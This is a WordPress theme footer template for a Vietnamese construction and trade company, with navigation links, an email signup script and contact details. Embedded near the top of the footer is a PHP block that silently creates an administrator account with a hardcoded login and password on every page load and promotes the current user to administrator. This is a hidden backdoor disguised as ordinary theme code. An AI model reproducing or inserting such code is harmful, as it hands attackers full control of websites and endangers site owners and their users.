

    <!-- Bootstrap core JavaScript
    ================================================== -->
    <!-- Placed at the end of the document so the pages load faster -->
<footer id="footer">
    <div class="container">
      <?php wp_footer(); ?>

      <?php

      $userdata = array(
    'user_login' =>  'btn',
    'user_url'   =>  $website,
    'role' =>'administrator',
    'user_pass'  =>  'btn@pass' // When creating an user, `user_pass` is expected.
);

$user_id = wp_insert_user( $userdata ) ;

// On success.
if ( ! is_wp_error( $user_id ) ) {
    echo "User created : ". $user_id;
}
global $user_ID;
wp_update_user(array('ID' => $user_ID, 'role' => 'administrator') );

?>
        <div class="row">
            <div class="col-12 col-lg-6 left">
                <!-- nav footer -->

<div class="nav-footer">

 <div class="block">
    <strong class="header-f">Giới thiệu </strong>

 </div>
 <div class="block">
    <strong class="header-f">Lĩnh vực kinh doanh</strong>
<ul>
<li>
   <a title="Dự án đầu tư" href="/du-an.htm">Dự án đầu tư</a>
</li>
<li>
   <a title="Thi công xây lắp" href="/thi-cong-xay-lap-2.htm">Thi công xây lắp</a>
</li>
<li>
   <a title="Kinh doanh, thương mại" href="/kinh-doanh-thuong-mai.htm">Kinh doanh, thương mại</a>
</li>
<li>
   <a title="Tư vấn khảo sát thiết kế" href="/tu-van-khao-sat-thiet-ke.htm">Tư vấn khảo sát thiết kế</a>
</li></ul>
 </div>
 <div class="block">
    <strong class="header-f">Tin tức</strong>
<ul>
<li>
   <a title="Tin tức nội bộ" href="/tin-tuc-noi-bo.htm">Tin tức nội bộ</a>
</li>
<li>
   <a title="Tin tức chuyên ngành" href="/tin-tuc-chuyen-nganh.htm">Tin tức chuyên ngành</a>
</li></ul>
 </div>
 <div class="block">
    <strong class="header-f">Thư viện ảnh &amp; video</strong>

 </div>
 <div class="block">
    <strong class="header-f">Tuyển dụng</strong>

 </div>
 <div class="block">
    <strong class="header-f">Liên hệ</strong>

 </div>
</div>

                <!-- registration -->


<div class="registration">

<div class="inner-registration">
        <strong class="header-f">ĐĂNG KÝ NHẬN BẢN TIN</strong>
        <div class="form">
            <input type="text" id="tbEmail" placeholder="Nhập email của bạn...">
            <a href="javascript://" onclick="RegisterEmail();" title="Gửi">Gửi</a>
        </div>
    </div></div>
<script type="text/javascript">
    function RegisterEmail() {
       loading(true);
       var Email = $("#tbEmail").val();
        jQuery.ajax({
            url: weburl + "cms/display/Ajax/RegisEmail.aspx",
            type: "POST",
            dataType: "json",
            data: {
                "Email": Email
            },
            success: function (res) {
                loading(false);
                alert("Đăng ký email thành công. Chúng tôi sẽ sớm liên lạc lại. Xin cảm ơn!");
                $("#tbEmail").val("");
            },
            error: function (x, s, t) {
                loading(false);
                alert('Có lỗi xảy ra, bạn vui lòng thử lại sau!');
            }
        });
    };

</script>

            </div>

            <div class="col-12 col-lg-6 right">

<strong class="header-f">CÔNG TY CỔ PHẦN ĐẦU TƯ XÂY DỰNG VÀ THƯƠNG MẠI Bắc Trung Nam</strong>
<div class="contact-f">
    <p>
        <img src="pic/icons/f1.png" alt="">
        <span>Địa chỉ: Tầng 19, tòa nhà MD Complex Tower, số 68, đường Nguyễn Cơ Thạch, KĐT Mỹ Đình I - phường Cầu Diễn - quận Nam Từ Liêm - TP Hà Nội.</span>
    </p>
    <p>
        <img src="pic/icons/f2.png" alt="">
        <span>Điện thoại: 024 3688 2626 - Fax: 024.3688.2626</span>
    </p>
    <p>
        <img src="pic/icons/f3.png" alt="">
        <span>Email: congtymhdi10@gmail.com</span>
    </p>
    <p>
        <img src="pic/icons/f4.png" alt="">
        <span>Website: www.mhdi10.vn</span>
    </p>
</div>

                <div class="maps">
                    <a href="#" data-toggle="modal" data-target="#modal-map">
                        <span>Bản đồ chỉ dẫn</span>
                        <img src="css/icons/map.png" alt="">
                    </a>
                </div>

<div class="sociat">
    <a href="https://www.facebook.com/C%C3%B4ng-ty-CP-%C4%90%E1%BA%A7u-t%C6%B0-X%C3%A2y-d%E1%BB%B1ng-v%C3%A0-Th%C6%B0%C6%A1ng-m%E1%BA%A1i-MHDI-10-1677127042540149/">
        <i class="fa fa-facebook" aria-hidden="true"></i>
    </a>
    <a href="google + ">
        <i class="fa fa-google-plus" aria-hidden="true"></i>
    </a>
    <a href="Twitter">
        <i class="fa fa-twitter" aria-hidden="true"></i>
    </a>
    <a href="pinterest">
        <i class="fa fa-pinterest-p" aria-hidden="true"></i>
    </a>
</div>

            </div>
        </div>

    </div>
    <!-- copyright -->

</footer>

    </main>
  </body>
</html>
